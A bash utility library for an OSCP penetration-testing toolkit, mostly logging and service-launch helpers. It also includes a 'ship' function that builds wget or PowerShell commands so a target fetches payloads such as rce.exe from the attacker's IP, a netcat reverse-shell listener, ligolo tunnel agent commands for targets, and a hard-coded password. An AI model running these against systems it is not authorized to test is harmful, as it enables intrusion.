#!/bin/bash
# About utils.sh
# utils.sh is a collection of utility functions that are used across the oscp-swiss scripts.


swiss_root="$HOME/oscp-swiss"
swiss_script="$swiss_root/script/oscp-swiss.sh"
swiss_alias="$swiss_root/script/alias.sh"
swiss_extension="$swiss_root/script/extension.sh"

swiss_utils="$swiss_root/utils"
swiss_module="$swiss_root/script/module"
swiss_private="$swiss_root/private"
swiss_wordlist="$swiss_root/wordlist"
swiss_settings="$swiss_root/settings.json"

# Description:
#   _log is the low level function for logging,
#   which wrap the echo command with ANSI color codes.
# Usage: _log [options] <text>
function _log() {
    local bold=""
    local fg_color=""
    local bg_color=""
    local no_color=0
    local text=""
    local underline=""
    local newline=1
    local ansi_bold="\033[1m"
    local ansi_underline="\033[4m"
    local ansi_reset="\033[0m"
    local fg_black="\033[30m"
    local fg_red="\033[31m"
    local fg_green="\033[32m"
    local fg_yellow="\033[33m"
    local fg_blue="\033[34m"
    local fg_magenta="\033[35m"
    local fg_cyan="\033[36m"
    local fg_white="\033[37m"
    local bg_black="\033[40m"
    local bg_red="\033[41m"
    local bg_green="\033[42m"
    local bg_yellow="\033[43m"
    local bg_blue="\033[44m"
    local bg_magenta="\033[45m"
    local bg_cyan="\033[46m"
    local bg_white="\033[47m"

    while [ "$1" ]; do
        case "$1" in
            --bold)
                bold=$ansi_bold
                shift
                ;;
            -u|--underline)
                underline=$ansi_underline
                shift
                ;;
            -f|--foreground)
                shift
                case "$1" in
                    black) fg_color=$fg_black ;;
                    red) fg_color=$fg_red ;;
                    green) fg_color=$fg_green ;;
                    yellow) fg_color=$fg_yellow ;;
                    blue) fg_color=$fg_blue ;;
                    magenta) fg_color=$fg_magenta ;;
                    cyan) fg_color=$fg_cyan ;;
                    white) fg_color=$fg_white ;;
                    *) fg_color="" ;;
                esac
                shift
                ;;
            -b|--background)
                shift
                case "$1" in
                    black) bg_color=$bg_black ;;
                    red) bg_color=$bg_red ;;
                    green) bg_color=$bg_green ;;
                    yellow) bg_color=$bg_yellow ;;
                    blue) bg_color=$bg_blue ;;
                    magenta) bg_color=$bg_magenta ;;
                    cyan) bg_color=$bg_cyan ;;
                    white) bg_color=$bg_white ;;
                    *) bg_color="" ;;
                esac
                shift
                ;;
            --no-color)
                no_color=1
                shift
                ;;
            -n|--no-newline)
                newline=0
                shift
                ;;
            *)
                text="$1"
                shift
                ;;
        esac
    done

    if [ "$_swiss_disable_color" = true ]; then

        if [ "$newline" -eq 1 ]; then
            echo -e "$text"
        else
            echo -e -n "$text"
        fi
        
    else

        if [ "$newline" -eq 1 ]; then
            echo -e "${bold}${underline}${fg_color}${bg_color}${text}${ansi_reset}"
        else
            echo -e -n "${bold}${underline}${fg_color}${bg_color}${text}${ansi_reset}"
        fi
    fi
}

# Description:
#   _check_logger_level is a helper function to check the logger level,
#   the function will return 0 if the given level is equal or higher than the global logger level.
# Configuration: global_settings.logger_level <debug|info|warn|error>
# Usage: _check_logger_level <level>
function _check_logger_level() {
    case "$_swiss_logger_level" in
        debug) return 0 ;;
        info) [[ "$1" != "debug" ]] ;;
        warn) [[ "$1" == "warn" || "$1" == "error" ]] ;;
        error) [[ "$1" == "error" ]] ;;
        *) return 1 ;;
    esac
}

# Description: impl of logger
# Usage: swiss_logger <level> <text>
function swiss_logger() {
    case "$1" in
        debug)
            _check_logger_level "debug" && _log -f white "$@"
            ;;
        info)
            _check_logger_level "info" && _log -f green "$@"
            ;;
        warn)
            _check_logger_level "warn" && _log -f yellow "$@"
            ;;
        error)
            _check_logger_level "error" && _log --bold -f red "$@"
            ;;
        prompt)
            # prompt must be display in any given level
            _check_logger_level "error" && _log -f green "$@"
            ;;
        hint)
            _log -f cyan "$@"
            ;;
        alternative)
            _log -f magenta "$@"
            ;;
        highlight)
            _log --bold -f white -b red "$@"
            ;;
        *)
            echo -n "$@"
            ;;
    esac
}

# Description:
#   Load all scripts under the $oscp-swiss/private directory.
#   If you have any private aliases, functions or variables, you can put them in the private directory.
#   Or if you already have a bunch of scripts, you can put them in the directory without any changes.
# Usage: _load_private_scripts
function _load_private_scripts() {
    if [ -d "$swiss_private" ]; then
        for script in "$swiss_private"/*.sh; do
            if [ -f "$script" ]; then
                source "$script"
            fi
        done
    else
        swiss_logger error "[e] Directory $swiss_private not found."
    fi
}

# Description: Get the default network interface's IP address.
# Usage: _get_default_network_interface_ip
function _get_default_network_interface_ip() {
    ip -o -f inet addr show | grep $_swiss_default_network_interface | awk '{split($4, a, "/"); printf "%s", a[1]}'
}

# Description: Display a banner for commands, which are replaced by aliases.
# Usage: _override_cmd_banner
function _override_cmd_banner() {
    if [ "$disable_sys_custom_command_banner" = false ]; then
        swiss_logger highlight "[ custom command, for default, add the sign _ in front of the command ]\n";
    fi
}

# Description: Display a banner for extension functions.
# Usage: _extension_fn_banner
function _extension_fn_banner() {
    swiss_logger highlight "[ The function may relies on non-native command, binaries, and libraries. You may need to check extension.sh before the run ]\n";
}

# Description:
#   Load the settings from the settings.json file.
#   All the key-value pairs under `global_settings` and `functions` are exported as environment variables.
#   Default location: $HOME/oscp-swiss/settings.json
# Usage: _load_settings
function _load_settings() {
    if [ ! -f "$swiss_settings" ]; then
        swiss_logger error "[e] $swiss_settings not found."
        return 1
    fi
    while IFS="=" read -r key value; do
        export "_swiss_$key"="$value"
    done < <(jq -r '.global_settings | to_entries | .[] | "\(.key)=\(.value)"' "$swiss_settings")
    while IFS="=" read -r key value; do
        export "_swiss_$key"="$value"
    done < <(jq -r '.functions | to_entries[] | .key as $k | .value | to_entries[] | "\($k)_\(.key)=\(.value)"' "$swiss_settings")
}

function _check_cmd_exist() {
    if command -v "$1" &> /dev/null
    then
        return 0
    else
        return 1
  fi
}

function _wrap() {
    for cmd in "$@"; do
        swiss_logger info "[i] Executing Commnad: $cmd"
        eval "$cmd"
    done
}

function _disable_auto_exploit_function() {
    swiss_logger highlight "[ The function MAY considered as automatic exploitation. Make sure you read the scripts! ]"
    if [ "$_swiss_disable_auto_exploit_function" = true ]; then
        return 1
    fi
}

# Description: 
#   Simplified version of the `ip a` command to show the IP address of the default network interface.
#   The default network interface's IP address is copied to the clipboard.
# Usage: i
# Category: [ ]
function i() {
    local auto_copy=false

    _helper() {
        swiss_logger info "[i] Usage: i [-c|--copy]"
    }

    while [[ $# -gt 0 ]]; do
        case $1 in
            -c|--copy)
                auto_copy=true
                shift
            ;;
            *)
                _helper
                return 1
            ;;
        esac
    done

    local default_ip=$(ip -o -f inet addr show | grep $_swiss_default_network_interface | awk '{split($4, a, "/"); printf "%s", a[1]}')
    swiss_logger info "[i] $_swiss_default_network_interface: $default_ip"

    if [[ "$auto_copy" = true ]]; then
        echo -n $default_ip | xclip -selection clipboard
    fi
}

# Description: one-liner to start services, including docker, ftp, http, smb, ssh, bloodhound, ligolo (extension), wsgi
# Usage: svc <service name>
# Arguments:
#   service name: docker; ftp; http; smb; ssh; bloodhound; ligolo (extension); wsgi
# Example:
#   svc http # to spawn a http server in the current directory
#   svc ftp  # to spawn a ftp server in the current directory
# Category: [ recon, pe ]
function svc() {
    local service=""

    _help() {
        swiss_logger info "Usage: svc <service name>]"
        swiss_logger info "service: docker; ftp; http; smb; ssh; bloodhound; ligolo; wsgi"
    }

    service="$1"

    if [[ -z "$service" ]]; then
        _help
        return 1
    fi

    case "$service" in
        docker)
            swiss_logger info "[i] start docker"
            swiss_logger warn "[w] to stop, use the following commands: "
            swiss_logger warn "[w] sudo systemctl stop docker"
            swiss_logger warn "[w] sudo systemctl stop docker.socket"
            sudo service docker restart
            ;;
        ftp)
            swiss_logger info "[i] start ftp server on host"
            swiss_logger info "usage:"
            swiss_logger info "\t(1) run ftp"
            swiss_logger info "\t(2) run open <ip> 21"
            swiss_logger info "\t(2-2) Default Interface ($_swiss_default_network_interface) IP: $(_get_default_network_interface_ip)"
            swiss_logger info "\t(3) use username anonymous"
            swiss_logger info "\t(4) binary # use binary mode"
            swiss_logger info "\t(5) put <file-you-want-to-download>"
            python3 -m pyftpdlib -w -p 21
            ;;
        http)
            swiss_logger info "[i] start http server"
            swiss_logger warn "[w] python3 -m http.server 80"
            i
            python3 -m http.server 80
            ;;
        smb)
            swiss_logger info "[i] start smb server"
            swiss_logger info "[i] impacket-smbserver smb . -smb2support"
            i
            impacket-smbserver smb . -smb2support
            ;;
        ssh)
            swiss_logger info "[i] start ssh server"
            swiss_logger warn "[w] sudo systemctl stop ssh; kill -9 $(pgrep ssh); sudo systemctl start ssh"
            i
            # kill all ssh process
            sudo systemctl stop ssh
            kill -9 $(pgrep ssh)
            sudo systemctl start ssh
            ;;
        bloodhound)
            swiss_logger info "[i] start BloodHound (v2.4.3) ..."
            # TODO: add more instructions & reproduce from skretch
            sudo neo4j console
            ;;
        bloodhound-ce)
            _extension_fn_banner
            # ref: https://support.bloodhoundenterprise.io/hc/en-us/articles/17468450058267-Install-BloodHound-Community-Edition-with-Docker-Compose
            swiss_logger info "[i] start BloodHound CE (v2.4.1) ..."
            swiss_logger info "[i] start port check on 8080"

            # Check if port 8080 is open using lsof
            if lsof -i :8080 > /dev/null; then
                swiss_logger error "[e] Port 8080 is open. Exited"
                exit 1
            fi

            swiss_logger info "[i] cloning docker-compose files from /opt/BloodHound/examples/docker-compose"
            cp /opt/BloodHound/examples/docker-compose/* $(pwd)

            swiss_logger info "[i] BloodHound CE starts on port 8080 (default), username: admin, password check on the terminal logs"
            swiss_logger info "[i] preferred password: @Bloodhound123"

            sudo docker-compose up
            ;;
        ligolo)
            _extension_fn_banner
            swiss_logger warn "[w] one-time setup: sudo ip tuntap add user $(whoami) mode tun ligolo; sudo ip link set ligolo up"
            swiss_logger info "[i] Example (On target): "
            swiss_logger info "[i] Linux: .\ligolo-ng_agent_0.6.2_linux_amd64 -connect $(_get_default_network_interface_ip):443 -ignore-cert"
            swiss_logger info "[i] Windows: .\ligolo-ng_agent_0.6.2_windows_amd64.exe -connect $(_get_default_network_interface_ip):443 -ignore-cert"
            swiss_logger info "[i] after connection: "
            swiss_logger info "[i] > session                                    # choose the session"
            swiss_logger info "[i] > ifconfig                                   # check interface"
            swiss_logger info "[i] sudo ip route add 192.168.0.0/24 dev ligolo  # add interface"
            swiss_logger warn "[w] ip route del 122.252.228.38/32               # removal after use"
            swiss_logger info "[i] start                                        # start the agent"
            swiss_logger info "[i] Add listener (e.g., for svc http): listener_add --addr 0.0.0.0:80 --to 127.0.0.1:80 --tcp"
            # TODO: add to configuration
            local ligolo_agent_path="$swiss_utils/tunnel/ligolo-0.6.2/proxy"
            $ligolo_agent_path -selfcert -laddr 0.0.0.0:443
            ;;
        wsgi)
            _extension_fn_banner
            swiss_logger info "[i] start wsgidav under the directory: $(pwd)"
            swiss_logger info "[i] port used: 80"
            i
            $_swiss_svc_wsgi --host=0.0.0.0 --port=$_swiss_svc_wsgi_default_port --auth=anonymous --root .
            ;;
        python-venv)
            _extension_fn_banner
            python3 -m venv .venv
            source .venv/bin/activate
            ;;
        *)
            swiss_logger error "[e] Invalid service '$service'. Valid service: docker; ftp; http; smb; ssh; bloodhound; wsgi; python-venv"
            return 1
            ;;
    esac
}

# Description: one-liner to ship files to the target machine. With no copy-paste needs.
# Usage: ship [-t|--type linux|windows] [-a|--auto-host-http] <filepath>
# Arguments:
#   -t|--type: linux|windows (default: linux)
#   -a|--auto-host-http: auto-host the http server (default: true)
# Example:
#   ship ./rce.sh
#   ship -t windows ./rce.exe
# Category: [ rce, pe, file-transfer ]
function ship() {
    local type="linux"
    local autoHostHttp=true
    local filepaths=()
    local all_cmds=""

    _helper() {
        swiss_logger info "Usage: ship [-t|--type linux|windows] [-a|--auto-host-http] <filepath>..."
        return 1
    }

    while [[ $# -gt 0 ]]; do
        case $1 in
            -t|--type)
                type="$2"
                shift 2
                ;;
            -a|--auto-host-http)
                autoHostHttp="$2"
                shift 2
                ;;
            -h|--help)
                _helper
                return 0
                ;;
            *)
                filepaths+=("$1")
                shift
                ;;
        esac
    done

    if [[ ${#filepaths[@]} -eq 0 ]]; then
        swiss_logger error "[e] At least one filepath is required."
        _helper
        return 1
    fi

    local all_cmds=""

    for filepath in "${filepaths[@]}"; do
        if [[ ! -f "$filepath" ]]; then
            swiss_logger error "[e] File '$filepath' does not exist."
            return 1
        fi

        local filename=$(basename "$filepath")
        cp "$filepath" "./$filename" && swiss_logger info "[i] File '$filename' copied to current directory."

        local cmd
        if [[ "$type" == "linux" ]]; then
            cmd="wget $(_get_default_network_interface_ip)/$filename"
        elif [[ "$type" == "windows" ]]; then
            cmd="powershell -c \"Invoke-WebRequest -Uri 'http://$(_get_default_network_interface_ip)/$filename' -OutFile C:/ProgramData/$filename\""
        else
            log error "[e] Unknown type '$type'."
            return 1
        fi

        all_cmds+="$cmd"$'\n'
    done

    _autoHost() {
        if [[ "$autoHostHttp" = true ]]; then
            svc http
        else
            swiss_logger warn "[w] Remember to host the web server on your own"
        fi
    }

    echo -n "$all_cmds" | xclip -selection clipboard
    swiss_logger info "[i] All commands copied to clipboard."
    _autoHost

    # TODO: remove the copied files automatically with global conf
}

# Description:
#   One-liner to start a reverse shell listener,
#   warpped with rlwrap to make the reverse shell interactive
# Usage: listen <port>
# Category: [ rce ]
function listen() {
    i
    rlwrap nc -lvnp $1
}

_load_settings
_load_private_scripts